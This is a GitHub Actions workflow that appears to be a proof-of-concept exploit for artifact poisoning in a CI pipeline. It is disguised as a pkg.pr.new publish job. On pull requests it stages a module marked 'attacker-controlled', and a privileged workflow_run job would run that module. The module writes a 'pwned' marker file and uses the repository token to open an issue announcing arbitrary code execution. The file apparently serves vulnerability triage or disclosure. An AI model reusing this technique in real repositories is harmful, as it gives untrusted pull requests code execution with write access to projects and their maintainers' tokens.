name: Publish to pkg.pr.new
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    if: github.repository == 'PDFtoMark/triage-sveltejs-v46d682b-124463'
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
      - name: Stage attacker-controlled artifact
        run: |
          mkdir -p tools
          cat > tools/pkg.pr.new-comment.mjs <<'JS'
          import fs from 'node:fs';
          fs.writeFileSync('pwned-marker.json', JSON.stringify({
            module: 'attacker',
            cwd: process.cwd(),
            repository: process.env.GITHUB_REPOSITORY,
            event: process.env.GITHUB_EVENT_NAME
          }));
          console.log('ATTACKER-MODULE-TOP-LEVEL-RCE', process.cwd());
          export default async function ({ github, context }) {
            const issue = await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: 'ATTACKER-MARKER: privileged workflow_run executed artifact code',
              body: 'ATTACKER-COMMENT: arbitrary code ran in the privileged workflow_run workflow. Run ' + context.runId
            });
            console.log('ATTACKER-ISSUE-OK', issue.data.number, issue.data.html_url);
          }
          JS
          echo '{"number":1,"sha":"deadbeef","packages":[]}' > output.json
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
        with:
          name: output
          path: |
            output.json
            tools/pkg.pr.new-comment.mjs
